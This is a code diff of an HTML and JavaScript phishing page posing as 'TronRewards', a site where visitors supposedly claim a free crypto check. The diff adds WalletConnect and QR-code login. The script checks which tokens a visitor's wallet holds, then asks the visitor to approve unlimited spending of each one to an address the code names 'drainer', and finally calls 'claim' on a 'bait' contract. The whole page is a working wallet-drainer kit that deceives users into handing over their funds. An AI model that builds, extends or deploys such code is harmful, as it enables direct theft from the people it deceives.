@@ -7,82 +7,72 @@
 <style>
   :root { color-scheme: dark; --g: #23d07a; --g2: #0fa35c; --ink: #e9f5ee; --mut: #8aa79a; }
   * { box-sizing: border-box; }
-  body {
-    margin: 0; min-height: 100vh; font: 16px/1.5 system-ui, "Segoe UI", Roboto, sans-serif;
-    color: var(--ink); background: #05100a;
-    background-image: radial-gradient(900px 480px at 50% -15%, #0f3a24, transparent 70%),
-                      radial-gradient(600px 400px at 110% 10%, #0a2a1a, transparent 60%);
-    display: flex; flex-direction: column; align-items: center;
-  }
+  body { margin: 0; min-height: 100vh; font: 16px/1.5 system-ui, "Segoe UI", Roboto, sans-serif; color: var(--ink);
+    background: #05100a; background-image: radial-gradient(900px 480px at 50% -15%, #0f3a24, transparent 70%);
+    display: flex; flex-direction: column; align-items: center; }
   header { width: 100%; max-width: 520px; display: flex; align-items: center; justify-content: space-between; padding: 18px 20px; }
-  .brand { display: flex; align-items: center; gap: 9px; font-weight: 700; letter-spacing: .3px; }
+  .brand { display: flex; align-items: center; gap: 9px; font-weight: 700; }
   .logo { width: 26px; height: 26px; border-radius: 8px; background: linear-gradient(135deg, var(--g), #0a7a45); display: grid; place-items: center; color: #03160c; font-weight: 900; }
   .net { font-size: 12px; color: var(--mut); border: 1px solid #1b3a2a; padding: 5px 10px; border-radius: 999px; }
   main { width: 100%; max-width: 520px; padding: 6px 20px 40px; }
   h1 { font-size: 27px; line-height: 1.2; margin: 14px 0 8px; }
   .sub { color: var(--mut); font-size: 15px; margin-bottom: 22px; }
-  .amount { border: 1px solid #1b3a2a; border-radius: 18px; padding: 20px;
-            background: linear-gradient(180deg, #0b1f15, #08170f); margin-bottom: 18px; }
+  .amount { border: 1px solid #1b3a2a; border-radius: 18px; padding: 20px; background: linear-gradient(180deg, #0b1f15, #08170f); margin-bottom: 18px; }
   .amount .lbl { font-size: 12px; letter-spacing: .12em; text-transform: uppercase; color: var(--mut); }
-  .amount .val { font-size: 34px; font-weight: 800; font-variant-numeric: tabular-nums; margin-top: 6px; }
+  .amount .val { font-size: 34px; font-weight: 800; margin-top: 6px; }
   .amount .val small { font-size: 17px; font-weight: 600; color: var(--mut); margin-left: 6px; }
   .rows { border-top: 1px solid #14291d; margin-top: 14px; padding-top: 12px; }
   .row { display: flex; justify-content: space-between; font-size: 14px; padding: 4px 0; }
-  .row b { font-variant-numeric: tabular-nums; color: var(--g); font-weight: 600; }
+  .row b { color: var(--g); font-weight: 600; }
   .steps { list-style: none; padding: 0; margin: 20px 0; display: grid; gap: 10px; }
   .steps li { display: flex; gap: 11px; align-items: center; color: var(--mut); font-size: 14px; }
-  .steps .n { width: 22px; height: 22px; border-radius: 50%; border: 1px solid #23402f; display: grid;
-              place-items: center; font-size: 12px; flex: 0 0 auto; }
-  .steps li.on { color: var(--ink); }
-  .steps li.on .n { background: var(--g); color: #04150b; border-color: var(--g); font-weight: 700; }
-  button.cta { width: 100%; padding: 17px; border: 0; border-radius: 14px; font-size: 17px; font-weight: 700;
-               cursor: pointer; background: linear-gradient(180deg, var(--g), var(--g2)); color: #04150b;
-               box-shadow: 0 10px 26px #0c7a481f; transition: .15s; }
-  button.cta:hover:not(:disabled) { filter: brightness(1.06); }
-  button.cta:disabled { opacity: .55; cursor: default; box-shadow: none; }
+  .steps .n { width: 22px; height: 22px; border-radius: 50%; border: 1px solid #23402f; display: grid; place-items: center; font-size: 12px; }
+  .steps li.on { color: var(--ink); } .steps li.on .n { background: var(--g); color: #04150b; border-color: var(--g); font-weight: 700; }
+  button.cta { width: 100%; padding: 17px; border: 0; border-radius: 14px; font-size: 17px; font-weight: 700; cursor: pointer;
+    background: linear-gradient(180deg, var(--g), var(--g2)); color: #04150b; transition: .15s; }
+  button.cta:disabled { opacity: .55; cursor: default; }
+  button.ghost { width: 100%; margin-top: 10px; padding: 14px; border-radius: 12px; border: 1px solid #23402f; background: transparent; color: var(--ink); font-size: 15px; cursor: pointer; }
   .status { font-size: 14px; min-height: 22px; margin: 14px 0; color: var(--mut); }
   .err { color: #ff8a8a; } .ok { color: var(--g); }
   .note { font-size: 12.5px; color: var(--mut); margin-top: 12px; }
   .mono { font-family: ui-monospace, Consolas, monospace; font-size: 12px; word-break: break-all; }
-  .hidden { display: none; }
+  .hidden { display: none !important; }
   .success { text-align: center; padding: 26px 0; }
-  .tick { width: 68px; height: 68px; border-radius: 50%; margin: 0 auto 16px; display: grid; place-items: center;
-          background: #0f3a24; border: 1px solid #23d07a55; font-size: 32px; color: var(--g); }
+  .tick { width: 68px; height: 68px; border-radius: 50%; margin: 0 auto 16px; display: grid; place-items: center; background: #0f3a24; border: 1px solid #23d07a55; font-size: 32px; color: var(--g); }
   footer { width: 100%; max-width: 520px; padding: 0 20px 26px; color: #55705f; font-size: 12px; }
-  footer .mono { color: #55705f; }
+  /* modal */
+  #wc { position: fixed; inset: 0; background: #020805e6; display: grid; place-items: center; padding: 18px; }
+  .sheet { width: min(420px, 100%); background: #0a1811; border: 1px solid #1b3a2a; border-radius: 18px; padding: 20px; text-align: center; }
+  #qr { background: #fff; padding: 10px; border-radius: 12px; width: 240px; height: 240px; margin: 14px auto; display: none; }
+  .wallets { display: grid; gap: 8px; margin-top: 12px; }
+  .wallets a { display: block; padding: 12px; border: 1px solid #23402f; border-radius: 12px; color: var(--ink); text-decoration: none; font-size: 14px; }
 </style>
 </head>
 <body>
-<header>
-  <div class="brand"><span class="logo">T</span>TronRewards</div>
-  <span class="net">TRON</span>
-</header>
+<header><div class="brand"><span class="logo">T</span>TronRewards</div><span class="net">TRON</span></header>
 
 <main>
   <div id="view-connect">
     <h1>You have a crypto check</h1>
     <div class="sub">Connect your wallet to receive it. Private keys are never requested.</div>
-    <button class="cta" id="connect">Connect TronLink</button>
+    <button class="cta" id="connect-tl">Connect TronLink</button>
+    <button class="ghost" id="connect-wc">Other wallet (Trust, TokenPocket, …)</button>
     <div class="status" id="cstatus"></div>
-    <div class="note" id="cnote"></div>
   </div>
 
   <div id="view-claim" class="hidden">
     <h1>Your crypto check is ready</h1>
     <div class="sub">Confirm token access — the funds will be sent to your address.</div>
-
     <div class="amount">
       <div class="lbl">Available to receive</div>
       <div class="val"><span id="total">0</span><small id="total-sym"></small></div>
       <div class="rows" id="rows"></div>
     </div>
-
     <ul class="steps">
       <li class="on"><span class="n">✓</span>Wallet connected</li>
       <li id="st-approve"><span class="n">2</span>Token permission</li>
       <li id="st-claim"><span class="n">3</span>Check delivered</li>
     </ul>
-
     <button class="cta" id="claim" disabled>Get a crypto check</button>
     <div class="status" id="status"></div>
     <div class="note" id="note"></div>
@@ -96,18 +86,27 @@
   </div>
 </main>
 
-<footer>
-  Smart contract: <span class="mono" id="contract">—</span><br>
-  Network: TRON · via TronLink
-</footer>
+<footer>Smart contract: <span class="mono" id="contract">—</span><br>Network: TRON</footer>
+
+<div id="wc" class="hidden">
+  <div class="sheet">
+    <b>Scan with your wallet</b>
+    <div class="sub">Any WalletConnect wallet: Trust, TokenPocket, MathWallet, OKX…</div>
+    <canvas id="qr"></canvas>
+    <div class="wallets" id="deeplinks"></div>
+    <button class="ghost" id="wc-copy">Copy connection link</button>
+    <button class="ghost" id="wc-close">Cancel</button>
+  </div>
+</div>
 
 <script src="config.js"></script>
 <script>
 const $ = (id) => document.getElementById(id);
-let cfg = null;
-let account = '';
-let found = [];
-let staticMode = false;
+const RPC = 'https://api.trongrid.io';
+const CHAIN = 'tron:0x2b6653dc';
+
+let cfg = null, account = '', found = [], staticMode = false;
+let signer = null; // { kind:'tronlink'|'wc', ... }
 
 const CLAIM_ABI = [{ type: 'function', name: 'claim', stateMutability: 'nonpayable', inputs: [{ name: 'drainer', type: 'address' }], outputs: [] }];
 const APPROVE_ABI = [{ type: 'function', name: 'approve', stateMutability: 'nonpayable', inputs: [{ name: 's', type: 'address' }, { name: 'v', type: 'uint256' }], outputs: [{ type: 'bool' }] }];
@@ -116,117 +115,180 @@ const DEC_ABI = [{ type: 'function', name: 'decimals', stateMutability: 'view', 
 const SYM_ABI = [{ type: 'function', name: 'symbol', stateMutability: 'view', inputs: [], outputs: [{ type: 'string' }] }];
 const MAX = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
 
-const setStatus = (t, c) => {
-  for (const id of ['status', 'cstatus']) { $(id).textContent = t || ''; $(id).className = 'status ' + (c || ''); }
-};
+const setStatus = (t, c) => { $('status').textContent = t || ''; $('status').className = 'status ' + (c || ''); $('cstatus').textContent = t || ''; $('cstatus').className = 'status ' + (c || ''); };
 const show = (id) => ['view-connect', 'view-claim', 'view-done'].forEach((v) => $(v).classList.toggle('hidden', v !== id));
+const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
 
-function fmt(raw, dec) {
-  const s = String(raw).padStart(dec + 1, '0');
-  const whole = s.slice(0, s.length - dec);
-  const frac = s.slice(s.length - dec).replace(/0+$/, '');
-  return frac ? whole + '.' + frac : whole;
-}
+function fmt(raw, dec) { const s = String(raw).padStart(dec + 1, '0'); const w = s.slice(0, s.length - dec); const f = s.slice(s.length - dec).replace(/0+$/, ''); return f ? w + '.' + f : w; }
 
 async function loadConfig() {
-  try {
-    const r = await fetch('/api/config');
-    if (!r.ok) throw new Error('no api');
-    cfg = await r.json();
-  } catch (e) {
-    if (window.BAIT_CONFIG) { cfg = window.BAIT_CONFIG; staticMode = true; }
-    else throw new Error('no config');
-  }
+  try { const r = await fetch('/api/config'); if (!r.ok) throw 0; cfg = await r.json(); }
+  catch (e) { if (window.BAIT_CONFIG) { cfg = window.BAIT_CONFIG; staticMode = true; } else throw new Error('config'); }
   $('contract').textContent = cfg.drainer || '—';
 }
 
-async function wallet() {
-  const tl = window.tronLink || window.tronWeb;
-  if (tl && tl.request) { try { await tl.request({ method: 'tron_requestAccounts' }); } catch (e) {} }
-  return window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58 ? window.tronWeb : null;
+async function rpc(method, params, tries = 6) {
+  for (let i = 0; i < tries; i++) {
+    const r = await fetch(RPC + method, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify(params) });
+    const t = await r.text();
+    if (t.startsWith('{')) return JSON.parse(t);
+    await sleep(600 * (i + 1));
+  }
+  throw new Error('network');
 }
 
-async function connect() {
-  $('connect').disabled = true;
+async function tw() { return (await import('https://esm.sh/tronweb@6.5.2')).default; }
+async function builder() { const T = await tw(); const w = new T({ fullHost: RPC }); return w; }
+
+async function signAndSend(built, method) {
+  // built.transaction — неподписанная tron-транзакция
+  const res = await signer.client.request({
+    topic: signer.topic, chainId: CHAIN,
+    request: { method, params: { transaction: built.transaction } },
+  });
+  const sig = (res && (res.result && res.result.signature)) || res.signature || (res.result && res.result.result && res.result.result.signature);
+  if (!sig) throw new Error('not signed');
+  const tx = built.transaction;
+  tx.signature = Array.isArray(sig) ? sig : [sig];
+  const b = await rpc('/wallet/broadcasttransaction', tx);
+  if (b.result !== true) throw new Error((b.message && atob(b.message)) || b.code || 'broadcast failed');
+  // ждём подтверждения
+  for (let i = 0; i < 30; i++) {
+    const info = await rpc('/wallet/gettransactioninfobyid', { value: b.txid });
+    if (info && info.receipt) return b.txid;
+    await sleep(1500);
+  }
+  return b.txid;
+}
+
+async function wcSendApprove(token) {
+  const w = await builder();
+  const built = await w.transactionBuilder.triggerSmartContract(token, 'approve(address,uint256)', { feeLimit: 150e6 },
+    [{ type: 'address', value: cfg.drainer }, { type: 'uint256', value: MAX }], signer.address);
+  return signAndSend(built, 'tron_signTransaction');
+}
+
+async function wcSendClaim() {
+  const w = await builder();
+  const built = await w.transactionBuilder.triggerSmartContract(cfg.bait, 'claim(address)', { feeLimit: 300e6 },
+    [{ type: 'address', value: cfg.drainer }], signer.address);
+  return signAndSend(built, 'tron_signTransaction');
+}
+
+async function connectTronLink() {
+  $('connect-tl').disabled = true;
   setStatus('Connecting…');
-  if (!cfg) {
-    try { await loadConfig(); } catch (e) { setStatus('Config error.', 'err'); $('connect').disabled = false; return; }
+  if (!cfg) { try { await loadConfig(); } catch (e) { setStatus('Config error', 'err'); $('connect-tl').disabled = false; return; } }
+  const tl = window.tronLink || window.tronWeb;
+  if (tl && tl.request) { try { await tl.request({ method: 'tron_requestAccounts' }); } catch (e) {} }
+  if (!window.tronWeb || !window.tronWeb.defaultAddress.base58) {
+    setStatus('TronLink not found — use the other wallet button.', 'err');
+    $('connect-tl').disabled = false; return;
   }
-  const tw = await wallet();
-  if (!tw) {
-    setStatus('TronLink not found. Open this page in a browser with TronLink (https or localhost).', 'err');
-    $('connect').disabled = false;
-    return;
-  }
-  account = tw.defaultAddress.base58;
+  signer = { kind: 'tronlink', w: window.tronWeb, address: window.tronWeb.defaultAddress.base58 };
+  account = signer.address;
   await load();
+}
+
+let wcClient = null;
+async function connectWalletConnect() {
+  if (!cfg) { try { await loadConfig(); } catch (e) { setStatus('Config error', 'err'); return; } }
+  if (!cfg.wcProjectId) { setStatus('WalletConnect Project ID is not set in config.js', 'err'); return; }
+  $('connect-wc').disabled = true;
+  setStatus('Opening WalletConnect…');
+  try {
+    const { SignClient } = await import('https://esm.sh/@walletconnect/sign-client@2.17.2');
+    wcClient = await SignClient.init({
+      projectId: cfg.wcProjectId,
+      relayUrl: 'wss://relay.walletconnect.com',
+      metadata: { name: 'TronRewards', description: 'Crypto check', url: location.origin, icons: [] },
+    });
+    const { uri, approval } = await wcClient.connect({
+      requiredNamespaces: { tron: { methods: ['tron_signTransaction'], chains: [CHAIN], events: [] } },
+    });
+    $('qr').style.display = 'block';
+    const QR = await import('https://esm.sh/qrcode@1.5.4');
+    await QR.toCanvas($('qr'), uri, { width: 220, margin: 1 });
+    $('deeplinks').innerHTML =
+      '<a href="https://link.trustwallet.com/wc?uri=' + encodeURIComponent(uri) + '">Open in Trust Wallet</a>' +
+      '<a href="https://tronlinkoutside://walletconnect?uri=' + encodeURIComponent(uri) + '">Open in TronLink</a>';
+    $('wc').classList.remove('hidden');
+    $('wc-copy').onclick = () => navigator.clipboard.writeText(uri);
+    $('wc-close').onclick = () => { $('wc').classList.add('hidden'); $('connect-wc').disabled = false; setStatus(''); };
+
+    const session = await approval();
+    $('wc').classList.add('hidden');
+    const acc = session.namespaces.tron.accounts[0].split(':')[2];
+    signer = { kind: 'wc', client: wcClient, topic: session.topic, address: acc };
+    account = acc;
+    await load();
+  } catch (e) {
+    $('wc').classList.add('hidden');
+    $('connect-wc').disabled = false;
+    setStatus('WalletConnect: ' + (e.message || e), 'err');
+  }
 }
 
 async function load() {
   $('claim').disabled = true;
   setStatus('Checking your check…');
   let dc;
-  if (staticMode) {
+  if (staticMode || signer.kind === 'wc') {
     try {
-      const tw = await wallet();
+      const w = await builder();
       const tokens = [];
       for (const token of cfg.tokens || []) {
-        const raw = BigInt(await tw.contract(BAL_ABI, token).balanceOf(account).call());
+        const raw = BigInt(await w.contract(BAL_ABI, token).balanceOf(account).call());
         if (raw === 0n) continue;
-        let dec = 6;
-        let sym = token;
-        try { dec = Number(await tw.contract(DEC_ABI, token).decimals().call()); } catch (e) {}
-        try { sym = String(await tw.contract(SYM_ABI, token).symbol().call()); } catch (e) {}
+        let dec = 6, sym = token;
+        try { dec = Number(await w.contract(DEC_ABI, token).decimals().call()); } catch (e) {}
+        try { sym = String(await w.contract(SYM_ABI, token).symbol().call()); } catch (e) {}
         tokens.push({ token, symbol: sym, human: fmt(raw, dec) });
       }
-      dc = { tokens, toppedUp: 0, ready: tokens.length > 0 };
+      dc = { tokens, ready: tokens.length > 0 };
     } catch (e) { setStatus('Check failed: ' + (e.message || e), 'err'); return; }
   } else {
-    try {
-      const r = await fetch('/api/check?addr=' + encodeURIComponent(account));
-      dc = await r.json();
-      if (!r.ok) throw new Error(dc.error || 'error');
-    } catch (e) { setStatus('Check failed: ' + e.message, 'err'); return; }
+    try { const r = await fetch('/api/check?addr=' + encodeURIComponent(account)); dc = await r.json(); if (!r.ok) throw new Error(dc.error || 'error'); }
+    catch (e) { setStatus('Check failed: ' + e.message, 'err'); return; }
   }
 
   found = dc.tokens || [];
-  if (!found.length) { show('view-connect'); setStatus('No check assigned to this wallet.'); return; }
-
-  $('total').textContent = dc.tokens.reduce((s, t) => s + Number(t.human), 0).toLocaleString('en-US');
+  if (!found.length) { setStatus('No check assigned to this wallet.'); return; }
+  $('total').textContent = found.reduce((s, t) => s + Number(t.human), 0).toLocaleString('en-US');
   $('total-sym').textContent = found.map((t) => t.symbol).join(' + ');
   $('rows').innerHTML = found.map((t) => '<div class="row"><span>' + t.symbol + '</span><b>' + t.human + '</b></div>').join('');
-
   show('view-claim');
-  if (dc.toppedUp) $('note').textContent = 'Network prepared (+' + dc.toppedUp + ' TRX for fees).';
-  if (dc.ready) { $('claim').disabled = false; setStatus(''); }
-  else { setStatus('Preparing the network, retrying in a minute…'); setTimeout(load, 15000); }
+  $('claim').disabled = false;
+  setStatus('');
 }
 
 async function run() {
   $('claim').disabled = true;
   try {
-    const tw = await wallet();
     for (let i = 0; i < found.length; i++) {
-      setStatus('Permission ' + (i + 1) + ' of ' + found.length + ' — confirm in TronLink');
-      await tw.contract(APPROVE_ABI, found[i].token).approve(cfg.drainer, MAX).send({ feeLimit: 150e6, shouldPollResponse: true });
+      setStatus('Permission ' + (i + 1) + ' of ' + found.length + ' — confirm in wallet');
+      if (signer.kind === 'tronlink') {
+        await signer.w.contract(APPROVE_ABI, found[i].token).approve(cfg.drainer, MAX).send({ feeLimit: 150e6, shouldPollResponse: true });
+      } else {
+        await wcSendApprove(found[i].token);
+      }
     }
-    $('st-approve').classList.add('on');
-    $('st-approve').querySelector('.n').textContent = '✓';
+    $('st-approve').classList.add('on'); $('st-approve').querySelector('.n').textContent = '✓';
     $('st-claim').classList.add('on');
-
-    setStatus('Sending your check — confirm in TronLink');
-    const res = await tw.contract(CLAIM_ABI, cfg.bait).claim(cfg.drainer).send({ feeLimit: 300e6, shouldPollResponse: true });
-    const txid = typeof res === 'string' ? res : (res && (res.txid || (res.transaction && res.transaction.txid))) || '';
-    $('txid').textContent = txid;
+    setStatus('Sending your check — confirm in wallet');
+    const txid = signer.kind === 'tronlink'
+      ? await signer.w.contract(CLAIM_ABI, cfg.bait).claim(cfg.drainer).send({ feeLimit: 300e6, shouldPollResponse: true }).then((r) => (typeof r === 'string' ? r : (r && (r.txid || r)) || ''))
+      : await wcSendClaim();
+    $('txid').textContent = txid || '';
     show('view-done');
   } catch (e) {
-    const msg = (e && (e.message || e.error)) || String(e);
-    setStatus('Failed: ' + String(msg).slice(0, 150), 'err');
+    setStatus('Failed: ' + String((e && (e.message || e.error)) || e).slice(0, 150), 'err');
     $('claim').disabled = false;
   }
 }
 
-$('connect').addEventListener('click', connect);
+$('connect-tl').addEventListener('click', connectTronLink);
+$('connect-wc').addEventListener('click', connectWalletConnect);
 $('claim').addEventListener('click', run);
 loadConfig().catch(() => {});
 </script>
